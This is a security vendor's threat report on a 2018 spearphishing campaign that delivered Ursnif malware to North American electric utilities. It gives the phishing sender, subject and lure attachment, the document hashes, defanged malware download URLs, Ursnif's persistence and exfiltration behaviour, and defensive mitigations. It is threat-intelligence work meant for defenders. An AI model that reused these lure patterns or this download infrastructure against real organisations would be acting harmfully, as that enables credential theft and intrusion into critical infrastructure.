TR-2018-25: Phishing Campaign Targeting Electric Utility Companies
17 September 2018
ICS Impact
Dragos identified a spearphishing campaign targeting multiple electric utility companies and other ICS
organizations in North America. The attack attempts to deliver Ursnif malware and was designed to steal
credentials and other information. Successful ICS targeting groups like DYMALLOY have leveraged
“criminal” malware for initial intrusion operations in ICS organizations, so ICS owners and operators are
encouraged to understand how these types of campaigns operate and how to defend against them.

Executive Summary
Dragos identified a phishing campaign starting 30 August 2018 focusing on electric utility companies in North America. The malicious
emails deliver a malicious document file that attempts to deliver a variant of Ursnif malware. Ursnif is an information stealer,
previously observed in credential theft operations targeting financial institutions. Although not ICS focused, Ursnif allows for credential
harvesting and remote access and can be leveraged as an initial access tool for multiple purposes. Given targeting specificity on electric
utility operations, Dragos urges caution and advises organizations to monitor for attacks that may appear criminal in nature but which
could be utilized by ICS-targeting activity groups for Stage 1 operations in the ICS Cyber Kill Chain.

Key Findings
•
•
•

A spearphishing campaign targeted multiple electric utilitity companies and some additional ICS organizations with a focus
on North America.
The attack contained a weaponized Microsoft Office document which downloads a variant of the Ursnif information stealer.
Information stealer malware such as Ursnif can be used to capture information relevant to ICS operations, and thus used as
part of a Stage 1 ICS Cyber Kill Chain event to enable pivoting to Stage 2 operations.

Background
Dragos learned of a phishing campaign targeting several client sites focusing on the electric utility industry on 31 August 2018. Initial
analysis did not indicate any links to known activity group tactics, techniques, and procedures (TTPs). Further research identified
additional targeting of the electric utility space and related ICS operations. While many aspects of the phishing campaign appeared
“commodity” in nature, specificity in targeting was sufficient to merit further investigation.

Phishing Message
Dragos was able to recover an example of the phishing message. The message has the following characteristics:
Sender: debbiemccann[AT]gentilinimotors[DOT]com
Subject: Re: 2018 Member Involvement Survey
Attachment: Don_Schuch_Inquiry.doc
The message includes information about an energy co-op and, based on victim e-mail information, is designed specifically for the
recipient. Other recovered messages follow the same theme, referencing previous messages by starting with “Re:” in the subject line
and using the “*inquiry.doc” attachment format. Other observed email subjects include references to quotes and invoices, which are
fairly common phishing practices, but with targeting focused on ICS-related organizations.

Malicious Document
The initial malicious document identified has the following characteristics:
MD5: 8b82e654e3bf51311c7db244e7013057
SHA1: 3a9876ec9541a7874f757f9b882871dd27ec2c8c

Dragos was unable to successfully recover the referenced file in the web request above. Further research identified variants of the
request referenced in public data sets and in Dragos client data:
hXXp://treenosanywork[.]com/YUY/huonasdh.php?l=momo8.tkn
hXXp://treenosanywork[.]com/YUY/index.php
The URI structure observed – including the “YUY” directory and the “.tkn” extension – are associated with known Ursnif activity,1
an information stealer frequently deployed to gather banking and other financial data.

Ursnif Information Stealer
Ursnif first emerged in 2007 to target bank wire transfer systems. 2 Since then, the malware has constantly evolved and has
branched out to targeting end users, including harvesting credentials for email, cryptocurrency, websites and taking screenshots.
As such, Ursnif represents a fairly robust remote access and data theft tool that can be leveraged for numerous potential usecases.
Ursnif achieves its objectives by injecting itself into other running processes on the infected host.3 Ursnif is typically the last stage
in an attack chain beginning with initial access to the victim (such as the phishing campaign identified above) followed by local
code execution on the victim machine. Ursnif itself has many variants, rendering IOCs less than helpful to track ever-evolving
campaigns. However, an understanding of fundamental behaviors underpinning Ursnif installation and infection events enables
more robust defense against this and similar malware types. Examples of typical Ursnif behavior includes:
•

Malware installation in the “%AppData%” or “Temp” folder on victim machines.

•
•
•

Using “run” keys in the victim host registry to persist through system reboots, such as
“HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run”
Use of domain generation algorithms (DGAs)4 to produce highly variable, shifting command and control (C2) sites for
information exfiltration and adversary control.
Exfiltration using HTTP POST command instead of HTTP GET.

Focusing on the above behaviors, as detailed in the Mitigations section below, will allow defenders to respond to evolving threats
such as this.
While Ursnif itself has previously been used primarily as a banking trojan, the malware’s capabilities enable it to be used for data
theft and remote access in any target environment. As a result, the targeting in these observed campaigns, focusing on ICS-related
organizations with ICS-specific themes, is concerning as the tool could be used to facilitate initial intrusion operations as part of
the ICS Cyber Kill Chain. While this campaign does not align with any known activity groups, Dragos has previously identified activity
groups leveraging “commodity” or “criminal” malware for initial access prior to pivoting to ICS intrusions. 5

Indicators of Compromise

Mitigations
Host
•
•
•
•
•

Apply appropriate group policy (GPOs) or system configuration on Windows hosts to prevent program execution from local
%AppData% and %Temp% folders.
Monitor for changes to system registry values, especially common locations to achieve persistence such as “Run” registry
keys, to detect malware attempts to persist through system reboot.
Log and monitor PowerShell execution to capture suspicious activity such as download string creation often leveraged by VBA
to retrieve second-stage infection items.
Eliminate or significantly curtail local administrator accounts and privileges to reduce likely impact in the event of an infection.
Deploy multi-factor authentication schema for critical systems and services – such as Windows logon, SSH, VPNs, and similar
services – to reduce impact of data theft and credential theft attacks.

Network
•
•

•

Monitor and audit domain resolutions to monitor for potential domain generation algorithm (DGA) activity often used by
malware.
Deploy network monitoring to detect executable files retrieved from Internet locations and flag items coming from unknown
or untrusted locations as suspicious for potential further examination. This approach can also be applied to internal traffic to
detect payload movement from IT to ICS networks.
Monitor for HTTP POST activity without an initiating HTTP GET, frequently used in Ursnif data exfiltration and indicative of
non-standard, likely malicious web traffic.

Conclusion
The identified campaign represents a focused distribution of Ursnif malware to electric utility organizations and some related ICS
entities. While the malware itself is, at first glance, uninteresting, focused targeting makes this campaign suspicious. Combined with
Ursnif’s capability to function as a flexible remote access and data theft tool, campaigns such as the one detailed above can be used
by more sophisticated activity groups to mask an initial intrusion event while gathering data on the target network.
At this time, Dragos possesses no specific information indicating that the exact campaign resulting in this report is an initial intrusion
event leading to potential ICS attacks. However, given that successful ICS targeting groups such as DYMALLOY have leveraged
“criminal” malware for initial intrusion operations in ICS organizations, ICS owners and operators are strongly encouraged to
understand how campaigns such as this operate and what steps to take to defend against future such attacks. Adopting this behaviorbased approach to seemingly commodity attacks will enable defenders to better respond to and mitigate potential future operations.
